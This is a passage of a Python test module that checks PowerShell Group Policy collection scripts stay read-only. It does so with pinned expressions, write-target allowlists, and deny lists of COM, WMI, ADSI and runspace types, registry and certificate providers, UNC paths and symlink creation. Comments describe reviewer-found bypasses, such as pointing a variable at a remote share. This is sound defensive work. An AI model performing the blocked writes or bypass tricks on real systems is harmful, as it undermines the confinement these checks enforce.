                "guard if ($Value -match '^(?:[A-Za-z]:[\\\\/]|\\\\\\\\)') -> return",
            ),
        ),
        (
            (
                "[IO.File]::Open((Join-Path $OutputRoot 'collection.lock'), "
                "[IO.FileMode]::OpenOrCreate, [IO.FileAccess]::ReadWrite, [IO.FileShare]::None)"
            ),
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            (
                "[Text.Encoding]::UTF8.GetString($previousBytes).TrimStart([char]0xFEFF).TrimEn"
                'd([char[]]"`r`n")'
            ),
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "if (Test-Path -LiteralPath $marker) after []",
            ),
        ),
        (
            "[Text.Encoding]::UTF8.GetString($previousBytes).TrimStart([char]0xFEFF)",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "if (Test-Path -LiteralPath $marker) after []",
            ),
        ),
        (
            "[Text.Encoding]::UTF8.GetString($previousBytes)",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "if (Test-Path -LiteralPath $marker) after []",
            ),
        ),
        (
            "[string]::Equals($owner, $TaskName, [StringComparison]::OrdinalIgnoreCase)",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "if (Test-Path -LiteralPath $marker) after []",
                "if-condition after []",
            ),
        ),
        (
            "[Text.UTF8Encoding]::new($false).GetBytes($TaskName)",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "try",
            ),
        ),
        (
            "[Text.UTF8Encoding]::new($false)",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "try",
            ),
        ),
        (
            "[IO.File]::Delete($marker)",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "catch []",
                "else of [($null -ne $previousBytes)]",
            ),
        ),
        (
            "$lock.Dispose()",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "finally",
            ),
        ),
        (
            "$PSCmdlet.ShouldProcess($TaskName, 'Unregister collection task')",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "if ($Unregister) after []",
                "if-condition after []",
            ),
        ),
        (
            (
                "[datetime]::TryParseExact($At, 'HH:mm', "
                "[Globalization.CultureInfo]::InvariantCulture, "
                "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)"
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                "if-condition after []",
            ),
        ),
        (
            "[IO.Path]::GetFullPath($OutputRoot)",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
            ),
        ),
        (
            (
                '$PSCmdlet.ShouldProcess($TaskName, "Register collection as $account every '
                '$EveryDays day(s) at $At; limit $ExecutionTimeLimit")'
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                "if-condition after []",
            ),
        ),
        (
            "$Credential.GetNetworkCredential()",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "if (-not $GmsaAccount) after []",
                (
                    "guard if (-not $Credential -or $Credential.UserName -ne $ServiceAccount) "
                    "-> throw"
                ),
            ),
        ),
        (
            "[timespan]::Zero",
            ("scriptblock in AttributeAst",),
        ),
        (
            "(Get-Item -LiteralPath $OutputRoot -Force).Attributes",
            (
                "function Set-GpoLensCollectionOwner",
                "if-condition after []",
            ),
        ),
        (
            "[IO.FileAttributes]::ReparsePoint",
            (
                "function Set-GpoLensCollectionOwner",
                "if-condition after []",
            ),
        ),
        (
            "[IO.FileMode]::OpenOrCreate",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            "[IO.FileAccess]::ReadWrite",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            "[IO.FileShare]::None",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            "[Text.Encoding]::UTF8",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "if (Test-Path -LiteralPath $marker) after []",
            ),
        ),
        (
            "[StringComparison]::OrdinalIgnoreCase",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "if (Test-Path -LiteralPath $marker) after []",
                "if-condition after []",
            ),
        ),
        (
            "$MyInvocation.InvocationName",
            ("if-condition after []",),
        ),
        (
            "[datetime]::MinValue",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
            ),
        ),
        (
            "[Globalization.CultureInfo]::InvariantCulture",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                "if-condition after []",
            ),
        ),
        (
            "[Globalization.DateTimeStyles]::None",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                "if-condition after []",
            ),
        ),
        (
            "(Resolve-Path -LiteralPath $CollectorPath).ProviderPath",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
            ),
        ),
        (
            (
                "(Resolve-Path -LiteralPath (Join-Path $PSScriptRoot "
                "'Run-GpoLensCollection.ps1')).ProviderPath"
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
            ),
        ),
        (
            "$Credential.UserName",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "if (-not $GmsaAccount) after []",
                "if-condition after []",
            ),
        ),
        (
            "$Credential.GetNetworkCredential().Password",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "if (-not $GmsaAccount) after []",
                (
                    "guard if (-not $Credential -or $Credential.UserName -ne $ServiceAccount) "
                    "-> throw"
                ),
            ),
        ),
    ),
}

# Variable qualifiers a binding may carry. `$global:` leaks to the caller's
# session; a drive (`${alias:Get-Item}`, `$env:PSModulePath`, `${function:x}`,
# `${variable:x}`, `${C:\file}` — a file write) is a provider write.
_ALLOWED_QUALIFIERS = frozenset({"", "script", "local", "private"})

# PowerShell common parameters that WRITE a named variable; an allowlisted read
# command can thereby rebind a pinned path/exec variable (Sol BL-1). Rejected
# outright (names, their unambiguous prefixes, and the -ov/-pv/... aliases).
_VARIABLE_WRITING_PARAMS = frozenset(
    {"OutVariable", "PipelineVariable", "ErrorVariable", "WarningVariable", "InformationVariable"}
)
# Canonical (full, lowercased) names; the dumper resolves every parameter token
# — including unambiguous prefixes like `-Pi` and aliases like `-ov` — to its
# full name via the cmdlet's real metadata (DeepSeek round 5).
_VARIABLE_WRITING_CANON = frozenset(p.casefold() for p in _VARIABLE_WRITING_PARAMS)

# Instance methods that cause an external side effect (file/AD/registry/object
# mutation or a stream open/write). These require a receiver that is an
# allowlisted, pinned variable; a parenthesized/command receiver (receiver_var
# null) is rejected (Sol BL-2). Pure read/string/collection methods do not.
_SIDE_EFFECTING_METHODS = frozenset(
    {
        "Delete",
        "Open",
        "OpenWrite",
        "OpenRead",
        "Create",
        "CreateEntry",
        "CreateSubdirectory",
        "Write",
        "WriteByte",
        "WriteLine",
        "CopyTo",
        "MoveTo",
        "Replace",
        "SetInfo",
        "CommitChanges",
        "Put",
        "PutEx",
        "Save",
        "SetValue",
        "DeleteValue",
        "InvokeSet",
    }
)
# Methods that end or change the lifetime of a handle/resource. Releasing the
# collection lock early (a duplicate `$lock.Dispose()` before the protected
# block, Sol round-4 BL-3) unprotects everything after it, so these are guarded
# operations too: their count AND control-flow context are pinned.
_LIFETIME_METHODS = frozenset(
    {"Dispose", "Close", "Flush", "Release", "ReleaseMutex", "Unlock", "Lock", "SetLength"}
)

# A pinned root may legitimately be bound by a `foreach ($v in ...)` loop only
# where the real script does so (Run iterates `$archive` over the expired
# exports). Any other foreach binding of a pinned root is a rebind (DeepSeek
# NEW-BL-2), as is a `foreach` whose source carries an absolute/UNC/provider
# path.
FOREACH_ALLOWED_ROOTS: dict[str, frozenset[str]] = {
    "Run-GpoLensCollection.ps1": frozenset({"archive"}),
}
# PowerShell scope prefixes stripped before a pinned-variable lookup, so
# `$script:OutputRoot` / `$global:OutputRoot` cannot dodge the pin (NEW-BL-2).
_SCOPE_PREFIXES = ("script:", "global:", "local:", "private:", "using:", "variable:")

# Every write-path argument must be exactly one of these pinned expressions per
# script (normalized). No free child data: `Join-Path $root $segment`, a
# `$env:` component, a literal/computed `..`, or `New-Item -Name` are not in the
# set and fail (Sol BL-4).
WRITE_TARGET_EXPRESSIONS: dict[str, frozenset[str]] = {
    "Export-GpoEstate.ps1": frozenset(
        {
            "$OutputRoot",
            "$archive",
            "$dest",
            "$testFile",
            '(Join-Path $out "reports\\${safe}__$($gpo.Id).xml")',
            "(Join-Path $out 'AllGPOs.xml')",
            "(Join-Path $out 'collection-errors.json')",
            "(Join-Path $out 'gp-inheritance.json')",
            "(Join-Path $out 'gpo-inventory.json')",
            "(Join-Path $out 'gpo-metadata.json')",
            "(Join-Path $out 'group-members.json')",
            "(Join-Path $out 'ou-tree.json')",
            "(Join-Path $out 'principals.json')",
            "(Join-Path $out 'reports')",
            "(Join-Path $out 'sites.json')",
            "(Join-Path $out 'wmi-filters.json')",
        }
    ),
    "Export-GroupMembers.ps1": frozenset({"$OutputPath"}),
    "Export-Principals.ps1": frozenset({"$OutputPath"}),
    "Run-GpoLensCollection.ps1": frozenset(
        {
            "$CopyTo",
            "$LogPath",
            "$archive.FullName",
            "$delivery",
            "$folder",
            "$newest.FullName",
            "$next",
            "$old",
            "$partial",
            "(Join-Path $OutputRoot 'collection.lock')",
            "(Join-Path $exportDir 'gpo-inventory.json')",
        }
    ),
    "GpoLensCollectionMarker.ps1": frozenset({"$Marker", "$marker"}),
    "Register-GpoLensCollection.ps1": frozenset(
        {"$OutputRoot", "$marker", "(Join-Path $OutputRoot 'collection.lock')"}
    ),
}

# .NET type names (casefolded substrings) that are an AD/COM/WMI/runspace write
# or code-load surface. Rejected wherever they appear (cast, type literal,
# `using`), because such a receiver carries a write under an allowlisted
# instance-method name.
_FORBIDDEN_TYPE_SUBSTRINGS = (
    "adsi",
    "adsisearcher",
    "directoryservices",
    "directoryentry",
    "directorysearcher",
    "wscript",
    "comobject",
    "__comobject",
    "runspace",
    "powershell",
    "scriptblock",
    "wmi",
    "wmiclass",
    "wmisearcher",
    "cimsession",
    "cimclass",
    "ciminstance",
    "managementobject",
    "managementclass",
)

# File-writing commands and the bound parameters that name what they write.
# Move-Item removes its source, so both ends are write targets.
_WRITE_COMMANDS: dict[str, tuple[str, ...]] = {
    "Add-Content": ("Path", "LiteralPath"),
    "Copy-Item": ("Destination",),
    "Move-Item": ("Path", "LiteralPath", "Destination"),
    "New-Item": ("Path",),
    "Out-File": ("FilePath", "LiteralPath"),
    "Remove-Item": ("Path", "LiteralPath"),
    "Rename-Item": ("Path", "LiteralPath"),
    "Set-Content": ("Path", "LiteralPath"),
    "Tee-Object": ("FilePath", "LiteralPath"),
}
# Commands that write only when a path parameter is supplied (Get-GPOReport
# returns a string unless -Path is given — Sol get_gporeport).
_OPTIONAL_PATH_COMMANDS: dict[str, tuple[str, ...]] = {
    "Get-GPOReport": ("Path",),
}
# Static methods whose first argument is a path that may be created/written/deleted.
_WRITE_STATIC = {
    "IO.File::AppendAllText",
    "IO.File::Delete",
    "IO.File::Open",
    "IO.File::WriteAllBytes",
    "IO.File::WriteAllText",
    "IO.Compression.ZipFile::Open",
}
# New-Item item types that create a filesystem object other than a plain file or
# directory (a symlink/junction to SYSVOL re-points a confined root — Sol
# set_itemtype).
_FORBIDDEN_ITEM_TYPES = {"symboliclink", "junction", "hardlink"}
# Casefolded views of the tables above (names are canonicalized on load).
_WRITE_COMMANDS_CF = {
    k.casefold(): tuple(p.casefold() for p in v) for k, v in _WRITE_COMMANDS.items()
}
_OPTIONAL_PATH_COMMANDS_CF = {
    k.casefold(): tuple(p.casefold() for p in v) for k, v in _OPTIONAL_PATH_COMMANDS.items()
}
# A variable reference in source text: `$name`, `$scope:name`, `$drive:name` or
# `${...}`. Scope prefixes are stripped by _bare_var; a drive (env:) is kept.
_VARIABLE = re.compile(r"\$(?:\{([^}]+)\}|((?:[A-Za-z_][A-Za-z0-9_]*:)?[A-Za-z_][A-Za-z0-9_]*))")
# In a write TARGET (built from roots) any drive-qualified or UNC or `..` literal
# is illegitimate, including a single drive letter.
_ABSOLUTE_LITERAL = re.compile(r"[A-Za-z]:[\\/]|\\\\|(?:^|[\\/'\" ])\.\.(?:[\\/'\" ]|$)")
# A non-filesystem PowerShell provider qualifier (registry, cert, AD, env, ...).
_PROVIDER = re.compile(
    r"\b(?:HKLM|HKCU|HKCR|HKU|HKEY_[A-Z_]+|Cert|WSMan|Env|Variable|Function|Alias|AD):",
    re.IGNORECASE,
)
# In a parameter default or foreach source an absolute *filesystem* path is fine
# (it is the root itself); only UNC, a provider, or `..` are rejected.
_UNC_OR_DOTDOT = re.compile(r"\\\\|(?:^|[\\/'\" ])\.\.(?:[\\/'\" ]|$)")


def _cf(name: str) -> str:
    return name.casefold()


def _bare_var(name: str) -> str:
    """Casefold a variable name with any scope prefix stripped.

    ``$script:OutputRoot`` -> ``outputroot`` so a scoped assignment cannot dodge
    the pinned-variable lookup (DeepSeek NEW-BL-2).
    """
    cf = _cf(name)
    for prefix in _SCOPE_PREFIXES:
        if cf.startswith(prefix):
            return cf[len(prefix) :]
    return cf


def _vars_in(text: str | None) -> set[str]:
    return {_bare_var(a or b) for a, b in _VARIABLE.findall(text or "")}


def _normalize_type(name: str) -> str:
    """Canonical (casefolded, ``System.``-less) .NET type name."""
    cf = _cf(name)
    return cf[len("system.") :] if cf.startswith("system.") else cf


def _cfset(names: Any) -> frozenset[str]:
    return frozenset(_cf(n) for n in names)


def _method_key(type_name: str | None, member: str | None) -> str:
    return f"{_normalize_type(type_name or '')}::{_cf(member or '')}"


_WRITE_STATIC_CF = frozenset(_method_key(*k.split("::")) for k in _WRITE_STATIC)


def _canonicalize(entry: dict[str, Any]) -> dict[str, Any]:
    """Casefold every command, function, parameter, member, type and variable
    name in the semantic projections, once, as the inventory is loaded.

    PowerShell resolves all of these case-insensitively, so every comparison in
    the checks below is made against casefolded policy tables (adcs-lens found
    `_WRITEJSON` passing a check written for `_writeJson`). Source TEXT fields
    (binding right-hand sides, operation text, guard conditions) are left as
    written: they are compared verbatim, so a re-cased copy of a pinned
    expression is a new value and fails closed. ``ast_rows`` keep the source
    spelling (the golden records it).
    """
    if "commands" not in entry:
        return entry  # -AstOnly / -Sites records
    for command in entry["commands"]:
        if command["name"]:
            command["name"] = _cf(command["name"])
        command["function"] = _cf(command["function"])
        command["bound"] = {_cf(k): v for k, v in command["bound"].items()}
        for arg in command["arguments"]:
            if arg["parameter"]:
                arg["parameter"] = _cf(arg["parameter"])
    for member in entry["members"]:
        member["function"] = _cf(member["function"])
        for key in ("member", "type", "receiver_var"):
            if member[key]:
                member[key] = _cf(member[key])
    entry["functions"] = [_cf(n) for n in entry["functions"]]
    for fn in entry["function_params"]:
        fn["name"] = _cf(fn["name"])
        fn["params"] = [_cf(n) for n in fn["params"]]
        fn["pipeline_params"] = [_cf(n) for n in fn["pipeline_params"]]
    for binding in entry["variable_assignments"]:
        binding["name"] = _cf(binding["name"])
        binding["function"] = _cf(binding["function"])
    for ref in entry["variable_refs"]:
        ref["name"] = _cf(ref["name"])
        ref["drive"] = _cf(ref["drive"])
    for use in entry["variable_uses"]:
        use["name"] = _bare_var(use["name"])
        use["function"] = _cf(use["function"])
    for decl in entry["parameter_decls"]:
        decl["name"] = _cf(decl["name"])
        decl["function"] = _cf(decl["function"])
    for cond in entry["conditions"]:
        cond["function"] = _cf(cond["function"])
    for pin in entry["pipeline_inputs"]:
        pin["function"] = _cf(pin["function"])
    for prop in entry["properties"]:
        prop["function"] = _cf(prop["function"])
    for key in ("member_assignments", "index_assignments"):
        for item in entry[key]:
            item["function"] = _cf(item["function"])
            var = "receiver_var" if key == "member_assignments" else "root_var"
            if item[var]:
                item[var] = _cf(item[var])
    return entry


# ---------------------------------------------------------------------------
# Variable bindings (round-3 BL-2 / NEW-BL-1 / NEW-BL-3). Every way a variable
# can acquire a value is reduced to a binding key string:
#   "= <rhs>" / "+= <rhs>" ...   assignment (any operator)
#   "param" / "param <default>"  parameter declaration
#   "foreach <source>"           foreach loop variable
#   "ref <call>"                 [ref]$v handed to a call that may write it
#   "incdec <op>"                ++/--
#   "multi <rhs>"                $a, $b = ... (multiple assignment)
#   "arg <expr>"                 a local-function call site binds the parameter
#   "splat @<var>"               a splatted call may bind the parameter
#   "pipeline"                   a ValueFromPipeline parameter
#   "common -<Param>"            -OutVariable/-ErrorVariable/... writes it
#   "member <target> = <rhs>"    a property write on the variable's object
#   "index <target>"             an index write on the variable's object
# Every key is prefixed with the scope that makes the binding, `[<function>]`
# or `[script]` (a ForEach-Object/Where-Object/.ForEach() scriptblock runs in
# its caller's scope, so it is attributed to the enclosing function; a call-site
# argument belongs to the callee's scope). A pinned binding copied into another
# function is therefore a new key. Variable names are casefolded with scope
# prefixes (`$script:`) stripped.
# ---------------------------------------------------------------------------

_ASSIGN_OPERATORS = {
    "Equals": "=",
    "PlusEquals": "+=",
    "MinusEquals": "-=",
    "MultiplyEquals": "*=",
    "DivideEquals": "/=",
    "RemainderEquals": "%=",
    "QuestionQuestionEquals": "??=",
}
# PowerShell common parameters an advanced function accepts implicitly.
_COMMON_PARAMETERS = (
    "Debug",
    "ErrorAction",
    "ErrorVariable",
    "InformationAction",
    "InformationVariable",
    "OutBuffer",
    "OutVariable",
    "PipelineVariable",
    "ProgressAction",
    "Verbose",
    "WarningAction",
    "WarningVariable",
    "WhatIf",
    "Confirm",
)


def _binding_key(binding: dict[str, Any]) -> str:
    kind = binding["kind"]
    rhs = _norm(binding["rhs"])
    if kind == "assign":
        op = _ASSIGN_OPERATORS.get(binding["operator"], binding["operator"])
        return f"{op} {rhs}"
    if kind == "param":
        return f"param {rhs}".rstrip()
    if kind == "incdec":
        return f"incdec {binding['operator']}"
    return f"{kind} {rhs}".rstrip()


def _resolve_param(token: str, params: list[str]) -> str | None:
    """The parameter a `-token` binds to (exact name, else unique prefix)."""
    cf = _cf(token)
    exact = [p for p in params if _cf(p) == cf]
    if exact:
        return exact[0]
    prefixed = [p for p in params if _cf(p).startswith(cf)]
    return prefixed[0] if len(prefixed) == 1 else None


def _callable_functions(script: str, inv: dict[str, dict[str, Any]]) -> dict[str, dict[str, Any]]:
    """casefolded name -> function_params record, for in-file and dot-sourced functions."""
    found: dict[str, dict[str, Any]] = {}
    for source in (script, *POLICIES[script].dot_sources):
        for fn in inv[source]["function_params"]:
            found[_cf(fn["name"])] = fn
    return found


def _scope(function: str | None) -> str:
    return f"[{_cf(function)}]" if function else "[script]"


def _call_site_bindings(
    script: str, inv: dict[str, dict[str, Any]]
) -> tuple[list[tuple[str, str]], list[str]]:
    """([(param, scoped binding key)], [unresolvable call-site arguments])."""
    functions = _callable_functions(script, inv)
    bindings: list[tuple[str, str]] = []
    unresolved: list[str] = []
    for command in inv[script]["commands"]:
        fn = functions.get(_cf(command["name"] or ""))
        if fn is None:
            continue
        params: list[str] = list(fn["params"])
        scope = _scope(fn["name"])
        explicit: set[str] = set()
        positional: list[str] = []
        splats: list[str] = []
        for arg in command["arguments"]:
            value = arg["value"]
            if arg["parameter"] is None:
                if arg["value_kind"] == "VariableExpressionAst" and str(value).startswith("@"):
                    splats.append(str(value))
                else:
                    positional.append(_norm(value))
                continue
            param = _resolve_param(str(arg["parameter"]), params)
            if param is None:
                if _resolve_param(str(arg["parameter"]), list(_COMMON_PARAMETERS)) is not None:
                    continue  # common parameter; variable-writing ones are checked separately
                unresolved.append(f"line {command['line']}: {command['name']} -{arg['parameter']}")
                continue
            explicit.add(param)
            bindings.append(
                (
                    param,
                    f"{scope} arg {_norm(value)}" if value is not None else f"{scope} arg switch",
                )
            )
        free = [p for p in params if p not in explicit]
        for i, value in enumerate(positional):
            if i < len(free):
                bindings.append((free[i], f"{scope} arg {value}"))
            else:
                bindings.append(("args", f"{scope} arg {value}"))
        for splat in splats:
            for param in free:
                bindings.append((param, f"{scope} splat {splat}"))
        for param in fn["pipeline_params"]:
            bindings.append((param, f"{scope} pipeline"))
    return bindings, unresolved


def _all_bindings(script: str, inv: dict[str, dict[str, Any]]) -> dict[str, set[str]]:
    entry = inv[script]
    out: dict[str, set[str]] = {}

    def add(name: str, key: str) -> None:
        out.setdefault(_bare_var(name), set()).add(key)

    for binding in entry["variable_assignments"]:
        if _bare_var(binding["name"]) == "null":
            continue  # `$null = ...` discards output; it cannot rebind anything
        add(binding["name"], f"{_scope(binding['function'])} {_binding_key(binding)}")
    params, _ = _call_site_bindings(script, inv)
    for param, key in params:
        add(param, key)
    for write in _common_param_writes(entry):
        add(write["target"], f"{_scope(write['function'])} common -{write['parameter']}")
    for member in entry["member_assignments"]:
        if member["receiver_var"]:
            add(
                member["receiver_var"],
                f"{_scope(member['function'])} member {_norm(member['target'])}",
            )
    for index in entry["index_assignments"]:
        if index["root_var"]:
            add(index["root_var"], f"{_scope(index['function'])} index {_norm(index['target'])}")
    return out


# Variables the engine sets that a pinned value may read without being pinned
# itself. None of them may be bound by the scripts (check_bindings refuses any
# binding of an automatic/preference variable that is not in SPECIAL_BINDINGS).
_AUTO_READ_OK = frozenset(
    {
        "_",
        "psitem",
        "true",
        "false",
        "null",
        "psscriptroot",
        "pscmdlet",
        "myinvocation",
        "pid",
        "lastexitcode",
        "matches",
        "env:systemroot",
    }
)


def _required_vars(script: str, inv: dict[str, dict[str, Any]]) -> dict[str, str]:
    """Variables whose every binding must be pinned, with the first reason.

    Roots: write roots, variables in pinned write-target expressions, receivers
    of every instance-method call / property write / index write, splatted
    variables, every variable read by any command argument, .NET call argument
    or branch/loop condition, and dot-sourced function parameters pinned by
    their defining script. Then the closure: every variable read by any
    binding of a required variable. check_pinned_bindings requires PINNED_VARS
    to cover this set exactly.
    """
    entry = inv[script]
    reasons: dict[str, str] = {}

    def need(name: str | None, why: str) -> None:
        if not name:
            return
        bare = _bare_var(name)
        if bare not in reasons:
            reasons[bare] = why

    for root in WRITE_ROOTS[script]:
        need(root, "write root")
    for expr in sorted(WRITE_TARGET_EXPRESSIONS[script]):
        for var in sorted(_vars_in(expr)):
            need(var, f"write target {expr}")
    for member in entry["members"]:
        if not member["static"]:
            need(member["receiver_var"], f"receiver of .{member['member']}()")
    for member in entry["member_assignments"]:
        need(member["receiver_var"], f"property write {member['target']}")
    for index in entry["index_assignments"]:
        need(index["root_var"], f"index write {index['target']}")
    for ref in entry["variable_refs"]:
        if ref["splatted"]:
            need(ref["name"], "splatted")
    # Every variable read by ANY command argument, .NET call argument or
    # branch/loop condition (Sol round 6: `$metaPath = '\\host\share\x'` left
    # `Get-Content -LiteralPath $metaPath` textually pinned but reading a remote
    # path; `$Unregister = $true` flipped the guard of Unregister-ScheduledTask).
    for command in entry["commands"]:
        if not command["name"]:
            for var in sorted(_vars_in(command["text"])):
                need(var, f"dynamic invocation {_norm(command['text'])}")
        for arg in command["arguments"]:
            for var in sorted(_vars_in(arg["value"])):
                need(var, f"argument of {command['name'] or 'a dynamic invocation'}")
    for member in entry["members"]:
        for text in member["arguments"]:
            for var in sorted(_vars_in(text)):
                need(var, f"argument of .{member['member']}()")
    for cond in entry["conditions"]:
        for var in sorted(_vars_in(cond["text"])):
            need(var, f"condition {cond['text'][:60]}")
    for pin in entry["pipeline_inputs"]:
        for var in sorted(_vars_in(pin["text"])):
            need(var, f"pipeline input {pin['text'][:60]}")
    for source in POLICIES[script].dot_sources:
        for fn in inv[source]["function_params"]:
            for param in fn["params"]:
                if param in PINNED_VARS[source]:
                    need(param, f"parameter of {fn['name']} (pinned in {source})")
    bindings = _all_bindings(script, inv)
    pending = list(reasons)
    while pending:
        var = pending.pop()
        for key in sorted(bindings.get(var, set())):
            for ref in sorted(_vars_in(key)):
                if ref not in reasons:
                    reasons[ref] = f"read by a binding of ${var}"
                    pending.append(ref)
    return {var: why for var, why in reasons.items() if var not in _AUTO_READ_OK}


def _pwsh() -> str:
    exe = shutil.which("pwsh")
    if exe is None:
        if os.environ.get("CI"):
            pytest.fail("pwsh is required in CI for the collector read-only gate")
        pytest.skip("pwsh not installed; CI runs this gate (ubuntu runners ship pwsh)")
    return exe


def _run_dumper_raw(exe: str, paths: list[str], *flags: str, timeout: int = 120) -> Any:
    result = subprocess.run(
        [exe, "-NoProfile", "-NonInteractive", "-File", str(_DUMPER), *flags, *paths],
        capture_output=True,
        text=True,
        timeout=timeout,
        check=False,
    )
    assert result.returncode == 0, result.stderr
    return json.loads(result.stdout)


def _run_dumper(exe: str, paths: list[str]) -> dict[str, dict[str, Any]]:
    return {Path(e["path"]).name: _canonicalize(e) for e in _run_dumper_raw(exe, paths)}


@cache
def _inventory_for(exe: str) -> dict[str, dict[str, Any]]:
